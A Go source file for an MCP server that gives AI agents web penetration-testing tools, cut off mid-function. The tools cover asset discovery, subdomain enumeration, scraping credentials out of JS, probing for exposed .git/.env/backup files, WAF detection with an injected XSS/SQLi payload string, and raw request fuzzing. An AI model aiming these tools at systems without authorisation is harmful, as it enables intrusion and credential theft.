// dhunter-mcp: Mac 端 web 漏洞挖掘 MCP server。
//
// 借鉴 AutoHunter (StanleyNull) 的 executor/guard/js_analyzer 思路,
// 不做漏扫(nuclei 模板扫描),只暴露给 AI agent 用"人工式"主动测试工具。
//
// 协议:MCP streamable HTTP,端点 /message,Authorization: Bearer <token>。
// 注册到 dhunter 的 external_mcp 即可被多 worker 并行调用。
//
// 工具(14 个):
//   资产发现:   fofa_search, subfinder_enum, assetfinder_enum
//   信息收集:   fetch_js, js_analyzer, katana_crawl, leak_creds, gau_history, wayback_history
//   指纹:       httpx_probe, waf_detect
//   主动测试:   http_request, api_fuzz, auth_bypass_check
//   AI 辅助:    poc_scaffold, risk_score
//   数据:       write_finding
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

const defaultToken = "dhunter-mcp-please-change"

// ── MCP 协议层 (与 gsl5-mock 相同的最小实现) ──

type rpcRequest struct {
	JSONRPC string                 `json:"jsonrpc"`
	ID      interface{}            `json:"id,omitempty"`
	Method  string                 `json:"method"`
	Params  map[string]interface{} `json:"params,omitempty"`
}

type rpcResponse struct {
	JSONRPC string      `json:"jsonrpc"`
	ID      interface{} `json:"id"`
	Result  interface{} `json:"result,omitempty"`
	Error   *rpcError   `json:"error,omitempty"`
}

type rpcError struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

type toolDef struct {
	Name        string                 `json:"name"`
	Description string                 `json:"description"`
	InputSchema map[string]interface{} `json:"inputSchema"`
}

type toolCallResult struct {
	Content []toolContent `json:"content"`
	IsError bool          `json:"isError,omitempty"`
}

type toolContent struct {
	Type string `json:"type"`
	Text string `json:"text"`
}

func textR(s string) toolCallResult {
	return toolCallResult{Content: []toolContent{{Type: "text", Text: s}}}
}
func errR(s string) toolCallResult {
	return toolCallResult{Content: []toolContent{{Type: "text", Text: s}}, IsError: true}
}

// ── 工具实现 ──

// baidu_search 主动搜百度(免登录但可能弹验证)。返回搜索结果链接。
func baidu_search(ctx context.Context, args map[string]interface{}) toolCallResult {
	q, _ := args["query"].(string)
	if q == "" {
		return errR("query required")
	}
	numF, _ := args["num"].(float64)
	num := int(numF)
	if num <= 0 {
		num = 10
	}
	client := &http.Client{Timeout: 15 * time.Second}
	form := url.Values{"wd": {q}}
	api := "https://www.baidu.com/s?" + form.Encode()
	req, _ := http.NewRequestWithContext(ctx, "GET", api, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
	resp, err := client.Do(req)
	if err != nil {
		return errR("baidu: " + err.Error())
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4*1024*1024))
	// 提取标题+链接
	hrefRe := regexp.MustCompile(`<a[^>]+href="(https?://[^"]+)"[^>]*class="[^"]*result[^"]*"[^>]*>([\s\S]*?)</a>`)
	titleRe := regexp.MustCompile(`<[^>]+>`)
	matches := hrefRe.FindAllStringSubmatch(string(body), num*3)
	results := make([]map[string]string, 0, num)
	seen := map[string]struct{}{}
	for _, m := range matches {
		href := m[1]
		if strings.Contains(href, "baidu.com") || strings.Contains(href, "baiducontent.com") {
			continue
		}
		if _, ok := seen[href]; ok {
			continue
		}
		seen[href] = struct{}{}
		title := titleRe.ReplaceAllString(m[2], "")
		title = strings.TrimSpace(title)
		if title == "" {
			title = href
		}
		results = append(results, map[string]string{"title": title, "url": href})
		if len(results) >= num {
			break
		}
	}
	jb, _ := json.Marshal(map[string]interface{}{
		"query":   q,
		"count":   len(results),
		"results": results,
	})
	return textR(string(jb))
}

// bing_search 微软 Bing 搜索(国内可访问)。
func bing_search(ctx context.Context, args map[string]interface{}) toolCallResult {
	q, _ := args["query"].(string)
	if q == "" {
		return errR("query required")
	}
	numF, _ := args["num"].(float64)
	num := int(numF)
	if num <= 0 {
		num = 10
	}
	client := &http.Client{Timeout: 15 * time.Second}
	api := "https://cn.bing.com/search?q=" + url.QueryEscape(q) + "&count=" + strconv.Itoa(num)
	req, _ := http.NewRequestWithContext(ctx, "GET", api, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	resp, err := client.Do(req)
	if err != nil {
		return errR("bing: " + err.Error())
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4*1024*1024))
	// 提取 b_algo / b_title
	hrefRe := regexp.MustCompile(`<a[^>]+href="(https?://[^"]+)"[^>]*>\s*<h2[^>]*>([\s\S]*?)</h2>`)
	titleRe := regexp.MustCompile(`<[^>]+>`)
	matches := hrefRe.FindAllStringSubmatch(string(body), num*3)
	results := make([]map[string]string, 0, num)
	seen := map[string]struct{}{}
	for _, m := range matches {
		href := m[1]
		if strings.Contains(href, "bing.com") || strings.Contains(href, "microsoft.com") {
			continue
		}
		if _, ok := seen[href]; ok {
			continue
		}
		seen[href] = struct{}{}
		title := titleRe.ReplaceAllString(m[2], "")
		title = strings.TrimSpace(title)
		if title == "" {
			title = href
		}
		results = append(results, map[string]string{"title": title, "url": href})
		if len(results) >= num {
			break
		}
	}
	jb, _ := json.Marshal(map[string]interface{}{
		"query":   q,
		"count":   len(results),
		"results": results,
	})
	return textR(string(jb))
}

// icp_lookup 查 ICP 备案(aizhan,免登录)。
func icp_lookup(ctx context.Context, args map[string]interface{}) toolCallResult {
	keyword, _ := args["keyword"].(string)
	if keyword == "" {
		return errR("keyword required (公司名或域名)")
	}
	client := &http.Client{Timeout: 15 * time.Second}
	// aizhan 域名 ICP 查询
	if isDomain(keyword) {
		api := "https://icp.aizhan.com/" + keyword
		req, _ := http.NewRequestWithContext(ctx, "GET", api, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36")
		resp, err := client.Do(req)
		if err != nil {
			return errR("aizhan: " + err.Error())
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 2*1024*1024))
		// 抓 ICP 备案号 + 主办方
		icpNumRe := regexp.MustCompile(`(?:备案号|icp)[:：\s]*([京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼][A-Z]\w{5,7}号)`)
		ownerRe := regexp.MustCompile(`(?:主办单位|主办方|主办人)[:：\s]*([^<\n]+?)(?:<|$)`)
		icpNum := ""
		owner := ""
		if m := icpNumRe.FindStringSubmatch(string(body)); len(m) >= 2 {
			icpNum = m[1]
		}
		if m := ownerRe.FindStringSubmatch(string(body)); len(m) >= 2 {
			owner = strings.TrimSpace(m[1])
		}
		jb, _ := json.Marshal(map[string]interface{}{
			"domain":  keyword,
			"icp_num": icpNum,
			"owner":   owner,
			"source":  "aizhan",
		})
		return textR(string(jb))
	}
	// 公司名查询:用百度搜
	form := url.Values{"wd": {keyword + " 备案 域名"}}
	api := "https://www.baidu.com/s?" + form.Encode()
	req, _ := http.NewRequestWithContext(ctx, "GET", api, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	resp, err := client.Do(req)
	if err != nil {
		return errR("baidu: " + err.Error())
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2*1024*1024))
	hrefRe := regexp.MustCompile(`<a[^>]+href="(https?://[^"]+)"[^>]*>([\s\S]*?)</a>`)
	titleRe := regexp.MustCompile(`<[^>]+>`)
	matches := hrefRe.FindAllStringSubmatch(string(body), 30)
	results := make([]map[string]string, 0, 10)
	seen := map[string]struct{}{}
	for _, m := range matches {
		href := m[1]
		if strings.Contains(href, "baidu.com") {
			continue
		}
		if _, ok := seen[href]; ok {
			continue
		}
		seen[href] = struct{}{}
		title := strings.TrimSpace(titleRe.ReplaceAllString(m[2], ""))
		results = append(results, map[string]string{"title": title, "url": href})
		if len(results) >= 10 {
			break
		}
	}
	jb, _ := json.Marshal(map[string]interface{}{
		"keyword":  keyword,
		"query":    "site:beian.miit.gov.cn OR site:icp.aizhan.com " + keyword,
		"results":  results,
		"hint":     "如果想查具体域名,改用 keyword=yourdomain.com",
	})
	return textR(string(jb))
}

func isDomain(s string) bool {
	return regexp.MustCompile(`^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$`).MatchString(s)
}

// safeExec 调子进程,带超时和大小限制。
// 用 Pipe 抓 stdout,带 Reader 限制;stderr 一并回传便于 debug。
func safeExec(ctx context.Context, timeout time.Duration, name string, args ...string) (string, error) {
	c, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	cmd := exec.CommandContext(c, name, args...)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return "", err
	}
	if err := cmd.Start(); err != nil {
		return "", err
	}
	var outBuf, errBuf bytes.Buffer
	// 限 20MB 防止内存爆
	done := make(chan struct{}, 2)
	go func() {
		_, _ = io.Copy(&outBuf, io.LimitReader(stdout, 20*1024*1024))
		done <- struct{}{}
	}()
	go func() {
		_, _ = io.Copy(&errBuf, io.LimitReader(stderr, 4*1024*1024))
		done <- struct{}{}
	}()
	<-done
	<-done
	if err := cmd.Wait(); err != nil {
		if c.Err() == context.DeadlineExceeded {
			return outBuf.String() + "\n[stderr]: " + errBuf.String(), fmt.Errorf("timeout after %s: %s %v", timeout, name, args)
		}
		return outBuf.String() + "\n[stderr]: " + errBuf.String(), err
	}
	return outBuf.String(), nil
}

// runCommand 调任意子进程,带工作目录 + 环境变量覆盖。
func runCommand(ctx context.Context, timeout time.Duration, name string, args []string, env map[string]string, dir string) (string, error) {
	c, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	cmd := exec.CommandContext(c, name, args...)
	if dir != "" {
		cmd.Dir = dir
	}
	if env != nil {
		e := os.Environ()
		for k, v := range env {
			e = append(e, k+"="+v)
		}
		cmd.Env = e
	}
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	if err := cmd.Run(); err != nil {
		if c.Err() == context.DeadlineExceeded {
			return "", fmt.Errorf("timeout after %s", timeout)
		}
		return out.String() + "\n[stderr]: " + errBuf.String(), err
	}
	return out.String(), nil
}

// fofa_search 调 fofa API 找资产。
// 需要 FOFA_EMAIL + FOFA_KEY 环境变量,或 args.email/args.key 显式传入。
func fofa_search(ctx context.Context, args map[string]interface{}) toolCallResult {
	q, _ := args["query"].(string)
	sizeF, _ := args["size"].(float64)
	if q == "" {
		return errR("query required (FOFA 语法, e.g. domain=\"example.com\")")
	}
	email := getArgString(args, "email", os.Getenv("FOFA_EMAIL"))
	key := getArgString(args, "key", os.Getenv("FOFA_KEY"))
	if email == "" || key == "" {
		return errR("FOFA_EMAIL/FOFA_KEY missing (set env or pass email/key args)")
	}
	size := int(sizeF)
	if size <= 0 {
		size = 100
	}
	if size > 10000 {
		size = 10000
	}
	// FOFA v2 API
	apiURL := "https://fofa.info/api/v1/search/all"
	qbase64 := base64.StdEncoding.EncodeToString([]byte(q))
	form := url.Values{
		"email":   {email},
		"key":     {key},
		"qbase64": {qbase64},
		"size":    {strconv.Itoa(size)},
		"fields":  {"host,ip,port,protocol,country,city,server,title,banner,cert,lastupdatetime"},
		"page":    {"1"},
	}
	httpClient := &http.Client{Timeout: 30 * time.Second}
	req, _ := http.NewRequestWithContext(ctx, "POST", apiURL, strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := httpClient.Do(req)
	if err != nil {
		return errR("fofa api error: " + err.Error())
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return errR(fmt.Sprintf("fofa api http %d: %s", resp.StatusCode, string(body)))
	}
	var fofaResp struct {
		Error   bool     `json:"error"`
		Msg     string   `json:"msg"`
		Results [][]string `json:"results"`
	}
	if err := json.Unmarshal(body, &fofaResp); err != nil {
		return errR("fofa parse: " + err.Error())
	}
	if fofaResp.Error {
		return errR("fofa error: " + fofaResp.Msg)
	}
	// 输出紧凑 JSON,给 AI 解析
	out, _ := json.Marshal(map[string]interface{}{
		"query":   q,
		"size":    len(fofaResp.Results),
		"results": fofaResp.Results,
	})
	return textR(string(out))
}

// subfinder_enum 调 subfinder 二进制做子域枚举。
func subfinder_enum(ctx context.Context, args map[string]interface{}) toolCallResult {
	domain, _ := args["domain"].(string)
	if domain == "" {
		return errR("domain required")
	}
	binPath := getArgString(args, "bin", "subfinder")
	argsList := []string{"-d", domain, "-all", "-silent"}
	if threads, ok := args["threads"].(float64); ok && threads > 0 {
		argsList = append(argsList, "-t", strconv.Itoa(int(threads)))
	}
	out, err := safeExec(ctx, 5*time.Minute, binPath, argsList...)
	if err != nil {
		return errR("subfinder: " + err.Error())
	}
	hosts := dedupNonEmpty(strings.Split(out, "\n"))
	jb, _ := json.Marshal(map[string]interface{}{
		"domain":  domain,
		"count":   len(hosts),
		"subdoms": hosts,
	})
	return textR(string(jb))
}

// assetfinder_enum 调 assetfinder 二进制(被动子域)。
func assetfinder_enum(ctx context.Context, args map[string]interface{}) toolCallResult {
	domain, _ := args["domain"].(string)
	if domain == "" {
		return errR("domain required")
	}
	binPath := getArgString(args, "bin", "assetfinder")
	out, err := safeExec(ctx, 3*time.Minute, binPath, "--subs-only", domain)
	if err != nil {
		return errR("assetfinder: " + err.Error())
	}
	hosts := dedupNonEmpty(strings.Split(out, "\n"))
	jb, _ := json.Marshal(map[string]interface{}{
		"domain":  domain,
		"count":   len(hosts),
		"subdoms": hosts,
	})
	return textR(string(jb))
}

// fetch_js 抓页面的所有 JS 资源。用 katana 爬 + grep 抽 .js 链接。
func fetch_js(ctx context.Context, args map[string]interface{}) toolCallResult {
	target, _ := args["url"].(string)
	if target == "" {
		return errR("url required")
	}
	depthF, _ := args["depth"].(float64)
	depth := int(depthF)
	if depth <= 0 {
		depth = 2
	}
	// 1) 用 katana 爬链接
	binPath := getArgString(args, "bin", "katana")
	crawlOut, err := safeExec(ctx, 5*time.Minute, binPath,
		"-u", target, "-d", strconv.Itoa(depth),
		"-jc", // 爬 js
		"-kf", "all",
		"-silent",
	)
	if err != nil {
		// katana 失败不致命:降级为直接抓目标页面 HTML,再从 HTML 抽 JS 链接
		hc := &http.Client{Timeout: 15 * time.Second}
		req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (webhunter/1.0)")
		if resp, err2 := hc.Do(req); err2 == nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 2*1024*1024))
			resp.Body.Close()
			crawlOut = string(body)
		} else {
			crawlOut = ""
		}
	}
	// 2) 收集 js url
	jsURLs := extractJSURLs(target, crawlOut)
	// 3) 抓 JS 内容
	type jsResult struct {
		URL  string `json:"url"`
		Body string `json:"body,omitempty"`
		Size int    `json:"size"`
		Err  string `json:"err,omitempty"`
	}
	results := make([]jsResult, 0, len(jsURLs))
	httpClient := &http.Client{Timeout: 15 * time.Second}
	maxJS := 30
	if v, ok := args["max"].(float64); ok && v > 0 {
		maxJS = int(v)
	}
	if len(jsURLs) > maxJS {
		jsURLs = jsURLs[:maxJS]
	}
	for _, u := range jsURLs {
		req, _ := http.NewRequestWithContext(ctx, "GET", u, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 webhunter/1.0")
		resp, err := httpClient.Do(req)
		if err != nil {
			results = append(results, jsResult{URL: u, Err: err.Error()})
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1*1024*1024))
		resp.Body.Close()
		results = append(results, jsResult{URL: u, Body: string(body), Size: len(body)})
	}
	jb, _ := json.Marshal(map[string]interface{}{
		"target": target,
		"count":  len(results),
		"js":     results,
	})
	return textR(string(jb))
}

// js_analyzer 解析 JS 内容找 URL / 路径 / API 端点 / 凭证(参考 AutoHunter js_analyzer.py)。
func js_analyzer(ctx context.Context, args map[string]interface{}) toolCallResult {
	source, _ := args["source"].(string)
	urlHint, _ := args["url"].(string)
	if source == "" {
		return errR("source required (JS text)")
	}
	// 1) URL 模式: "https?://..."  / "/api/..." / 相对路径
	urlRe := regexp.MustCompile(`(?i)(?:https?:)?//[a-z0-9._~:/?#@!$&'()*+,;=%-]+|["'](/[a-z0-9._~:/?#@!$&'()*+,;=%-]+)["']`)
	apiRe := regexp.MustCompile(`["'](/(?:api|v1|v2|admin|user|auth|login|graphql|upload|download|file|asset|static|js|css)[a-z0-9._~:/?#@!$&'()*+,;=%-]*)["']`)
	credRe := regexp.MustCompile(`(?i)(api[_-]?key|secret|token|password|passwd|auth|access[_-]?key|app[_-]?key|bucket|aws|gcp|azure|firebase|jwt|client[_-]?secret)["'\s:=]+["']?([a-z0-9._+/=~\\-]{8,})["']?`)

	urls := dedupNonEmpty(urlRe.FindAllString(source, -1))
	apiMatches := apiRe.FindAllStringSubmatch(source, -1)
	credMatches := credRe.FindAllStringSubmatch(source, -1)
	creds := make([]map[string]string, 0, len(credMatches))
	for _, m := range credMatches {
		if len(m) >= 3 {
			creds = append(creds, map[string]string{
				"key":   strings.ToLower(m[1]),
				"value": m[2],
			})
		}
	}
	// 提取 API 路径(去引号)
	apiPaths := make([]string, 0, len(apiMatches))
	for _, m := range apiMatches {
		if len(m) >= 2 {
			apiPaths = append(apiPaths, strings.Trim(m[1], `"'`))
		}
	}
	apiPaths = dedupNonEmpty(apiPaths)
	_ = dedupNonEmpty
	jb, _ := json.Marshal(map[string]interface{}{
		"url":      urlHint,
		"urls":     urls,
		"api_paths": apiPaths,
		"creds":    creds,
		"stats": map[string]int{
			"url_count":  len(urls),
			"api_count":  len(apiPaths),
			"cred_count": len(creds),
		},
	})
	return textR(string(jb))
}

// katana_crawl 调 katana 爬链接。
func katana_crawl(ctx context.Context, args map[string]interface{}) toolCallResult {
	target, _ := args["url"].(string)
	if target == "" {
		return errR("url required")
	}
	depth := int(getArgFloat(args, "depth", 2))
	binPath := getArgString(args, "bin", "katana")
	out, err := safeExec(ctx, 8*time.Minute, binPath,
		"-u", target, "-d", strconv.Itoa(depth),
		"-silent",
		"-kf", "all",
	)
	if err != nil {
		return errR("katana: " + err.Error())
	}
	urls := dedupNonEmpty(strings.Split(out, "\n"))
	jb, _ := json.Marshal(map[string]interface{}{
		"target": target,
		"count":  len(urls),
		"urls":   urls,
	})
	return textR(string(jb))
}

// leak_creds 检查常见泄露路径(.git/.env/.DS_Store/svn 等),用 httpx 测存在性。
func leak_creds(ctx context.Context, args map[string]interface{}) toolCallResult {
	target, _ := args["url"].(string)
	if target == "" {
		return errR("url required (e.g. https://example.com)")
	}
	parsed, err := url.Parse(target)
	if err != nil {
		return errR("bad url: " + err.Error())
	}
	// 常见泄露 path
	paths := []string{
		".git/HEAD", ".git/config", ".git/index",
		".env", ".env.bak", ".env.local", ".env.production",
		".DS_Store", "Thumbs.db",
		".svn/entries", ".svn/wc.db",
		".htaccess", ".htpasswd", "web.config",
		"backup.zip", "backup.tar.gz", "backup.sql", "dump.sql",
		"robots.txt", "sitemap.xml", "crossdomain.xml",
		"phpinfo.php", "info.php", "test.php", "test.html",
		"admin/", "administrator/", "manage/", "backend/", "manager/",
		"api/", "api/v1/", "swagger/", "swagger.json", "swagger.yaml",
		"v1/docs", "v2/docs", "openapi.json", "openapi.yaml",
		"actuator/", "actuator/env", "actuator/health", "actuator/beans",
		"console/", "_debug/", "debug/", "trace.axd",
		"server-status", "server-info", "phpmyadmin/", "adminer.php",
		"web.config.bak", "config.php.bak", "config.bak",
	}
	client := &http.Client{
		Timeout: 8 * time.Second,
		Transport: &http.Transport{
			// TLS verification on by default; set `insecure: true` to skip.
			TLSClientConfig: &tls.Config{InsecureSkipVerify: getArgBool(args, "insecure", false)},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
	type result struct {
		Path   string `json:"path"`
		Status int    `json:"status"`
		Size   int    `json:"size"`
		URL    string `json:"url"`
	}
	var (
		wg     sync.WaitGroup
		mu     sync.Mutex
		hits   []result
		sem    = make(chan struct{}, 10) // 并发 10
	)
	for _, p := range paths {
		wg.Add(1)
		sem <- struct{}{}
		go func(p string) {
			defer wg.Done()
			defer func() { <-sem }()
			full := strings.TrimRight(parsed.String(), "/") + "/" + p
			req, _ := http.NewRequestWithContext(ctx, "GET", full, nil)
			req.Header.Set("User-Agent", "Mozilla/5.0 webhunter/1.0")
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			if resp.StatusCode == 200 || resp.StatusCode == 206 || resp.StatusCode == 301 || resp.StatusCode == 302 {
				mu.Lock()
				hits = append(hits, result{Path: p, Status: resp.StatusCode, Size: len(body), URL: full})
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()
	jb, _ := json.Marshal(map[string]interface{}{
		"target": target,
		"scanned": len(paths),
		"hits":    hits,
	})
	return textR(string(jb))
}

// gau_history 调 gau 查 url 历史。
func gau_history(ctx context.Context, args map[string]interface{}) toolCallResult {
	domain, _ := args["domain"].(string)
	if domain == "" {
		return errR("domain required")
	}
	binPath := getArgString(args, "bin", "gau")
	out, err := safeExec(ctx, 3*time.Minute, binPath, domain)
	if err != nil {
		return errR("gau: " + err.Error())
	}
	urls := dedupNonEmpty(strings.Split(out, "\n"))
	jb, _ := json.Marshal(map[string]interface{}{
		"domain": domain,
		"count":  len(urls),
		"urls":   urls,
	})
	return textR(string(jb))
}

// wayback_history 调 waybackurls 查历史。
func wayback_history(ctx context.Context, args map[string]interface{}) toolCallResult {
	domain, _ := args["domain"].(string)
	if domain == "" {
		return errR("domain required")
	}
	binPath := getArgString(args, "bin", "waybackurls")
	out, err := safeExec(ctx, 3*time.Minute, binPath, domain)
	if err != nil {
		return errR("waybackurls: " + err.Error())
	}
	urls := dedupNonEmpty(strings.Split(out, "\n"))
	jb, _ := json.Marshal(map[string]interface{}{
		"domain": domain,
		"count":  len(urls),
		"urls":   urls,
	})
	return textR(string(jb))
}

// httpx_probe 调 httpx 二进制主动探测。
func httpx_probe(ctx context.Context, args map[string]interface{}) toolCallResult {
	targets, _ := args["targets"].([]interface{})
	if len(targets) == 0 {
		if s, ok := args["target"].(string); ok && s != "" {
			targets = []interface{}{s}
		}
	}
	if len(targets) == 0 {
		return errR("target(s) required")
	}
	// 写到临时文件
	tmp, _ := os.CreateTemp("", "webhunter-httpx-*.txt")
	defer os.Remove(tmp.Name())
	for _, t := range targets {
		fmt.Fprintln(tmp, t)
	}
	tmp.Close()
	binPath := getArgString(args, "bin", "httpx")
	cmdArgs := []string{
		"-l", tmp.Name(),
		"-silent", "-no-color",
		"-status-code", "-title", "-tech-detect", "-content-length", "-web-server",
		"-follow-redirects",
	}
	if timeout, ok := args["timeout"].(float64); ok && timeout > 0 {
		cmdArgs = append(cmdArgs, "-timeout", strconv.Itoa(int(timeout)))
	}
	out, err := safeExec(ctx, 10*time.Minute, binPath, cmdArgs...)
	if err != nil {
		return errR("httpx: " + err.Error())
	}
	return textR(out)
}

// waf_detect 启发式探测 WAF(响应头 / 关键字 / cookie)。
func waf_detect(ctx context.Context, args map[string]interface{}) toolCallResult {
	target, _ := args["url"].(string)
	if target == "" {
		return errR("url required")
	}
	// 先正常请求,再发带恶意 payload 的请求,看响应差异
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: getArgBool(args, "insecure", false)},
		},
	}
	doReq := func(payload string) (int, http.Header, string) {
		req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
		req.Header.Set("User-Agent", payload)
		resp, err := client.Do(req)
		if err != nil {
			return 0, nil, err.Error()
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
		return resp.StatusCode, resp.Header, string(body)
	}
	benignCode, benignH, _ := doReq("Mozilla/5.0 (webhunter)")
	evilCode, _, evilBody := doReq("Mozilla/5.0 webhunter <script>alert(1)</script>' OR 1=1--")
	// WAF 关键字
	wafSignatures := map[string][]string{
		"cloudflare":     {"cloudflare", "cf-ray", "__cfduid"},
		"akamai":         {"akamai", "akamai-ghost"},
		"aws-waf":        {"x-amzn-requestid", "x-amz-cf-id"},
		"aliyun-waf":     {"set-cookie: aliyungf_tc="},
		"tencent-waf":    {"tencent-cloud", "waf.tencent-cloud.net"},
		"baidu-yunjiasu": {"yunjiasu"},
		"360-waf":        {"360wzb", "X-Powered-By-360WZB"},
		"safe3waf":       {"safe3waf", "x-powered-by: safe3waf"},
		"mod_security":   {"mod_security", "modsecurity"},
		"f5-big-ip":      {"big-ip", "f5-bigip"},
		"imperva":        {"imperva", "incapsula"},
		"sucuri":         {"sucuri", "x-sucuri-id"},
		"wordfence":      {"wordfence"},
	}
	hdrs := benignH.Values("Set-Cookie")
	combined := strings.Join(hdrs, "; ") + " " + benignH.Get("Server") + " " + benignH.Get("X-Powered-By")
	for k, vs := range benignH {
		combined += " " + strings.ToLower(k) + ": " + strings.Join(vs, ", ")
	}
	matched := []string{}
	for name, sigs := range wafSignatures {
		for _, sig := range sigs {
			if strings.Contains(strings.ToLower(combined), sig) {
				matched = append(matched, name)
				break
			}
		}
	}
	// 行为差异(被拦截的话)
	blocked := false
	if evilCode != 0 && evilCode != benignCode && (evilCode == 403 || evilCode == 406 || evilCode == 429 || evilCode == 503) {
		blocked = true
	}
	// 拦截页正文关键字:很多 WAF 返回 200 + 拦截页,状态码判不出来
	if !blocked && evilBody != "" {
		bl := strings.ToLower(evilBody)
		for _, sig := range []string{
			"access denied", "forbidden", "blocked", "blocked by", "waf",
			"web application firewall", "challenge", "verify you are human",
			"cf-challenge", "captcha", "anti-bot", "security check",
			"request rejected", "illegal request", "suspicious activity",
		} {
			if strings.Contains(bl, sig) {
				blocked = true
				break
			}
		}
	}
	jb, _ := json.Marshal(map[string]interface{}{
		"target":     target,
		"benign":     benignCode,
		"evil":       evilCode,
		"blocked":    blocked,
		"matched":    matched,
		"evil_body":  evilBody,
	})
	return textR(string(jb))
}

// http_request 主动 HTTP 请求 —— AI 渗透测试的瑞士军刀。
// 支持任意 method/header/cookie/body,返回完整响应。
func http_request(ctx context.Context, args map[string]interface{}) toolCallResult {
	method := strings.ToUpper(getArgString(args, "method", "GET"))
	target, _ := args["url"].(string)
	if target == "" {
		return errR("url required")
	}
	var body io.Reader
	if b, ok := args["body"].(string); ok && b != "" {
		body = strings.NewReader(b)
	}
	req, err := http.NewRequestWithContext(ctx, method, target, body)
	if err != nil {
		return errR("build req: " + err.Error())
	}
	// headers
	if hs, ok := args["headers"].(map[string]interface{}); ok {
		for k, v := range hs {
			req.Header.Set(k, fmt.Sprintf("%v", v))
		}
	}
	// cookies
	if cs, ok := args["cookies"].(map[string]interface{}); ok {
		for k, v := range cs {
			req.AddCookie(&http.Cookie{Name: k, Value: fmt.Sprintf("%v", v)})
		}
	}
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", "Mozilla/5.0 (webhunter/1.0)")
	}
	// timeout
	timeout := 15 * time.Second
	if t, ok := args["timeout"].(float64); ok && t > 0 {
		timeout = time.Duration(t) * time.Second
	}
	// allow insecure — default OFF so TLS certificates are verified unless
	// the caller explicitly opts out (insecure: true).
	insecure := false
	if inv, ok := args["insecure"].(bool); ok {
		insecure = inv
	}
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: insecure},
			ResponseHeaderTimeout: timeout,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return errR("request: " + err.Error())
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4*1024*1024))
	hdr := map[string][]string{}
	for k, v := range resp.Header {
		hdr[k] = v
	}
	jb, _ := json.Marshal(map[string]interface{}{
		"status":     resp.StatusCode,
		"proto":      resp.Proto,
		"headers":    hdr,
		"body":       string(respBody),
		"body_size":  len(respBody),
		"final_url":  resp.Request.URL.String(),
		"truncated":  len(respBody) >= 4*1024*1024,
	})
	return textR(string(jb))
}

// api_fuzz 参数 fuzz。AI 给定 URL + base params + 替换规则,生成 N 个变体,逐一请求。
func api_fuzz(ctx context.Context, args map[string]interface{}) toolCallResult {
	target, _ := args["url"].(string)
	if target == "" {
		return errR("url required")
	}
	paramName, _ := args["param_name"].(string)
	paramLoc, _ := args["param_loc"].(string) // query|body|header
	if paramLoc == "" {
		paramLoc = "query"
	}
	wordlistAny, _ := args["wordlist"].([]interface{})
	if len(wordlistAny) == 0 {
		return errR("wordlist required (string array)")
	}
	wordlist := make([]string, 0, len(wordlistAny))
	for _, w := range wordlistAny {
		wordlist = append(wordlist, fmt.Sprintf("%v", w))
	}
	if paramName == "" {
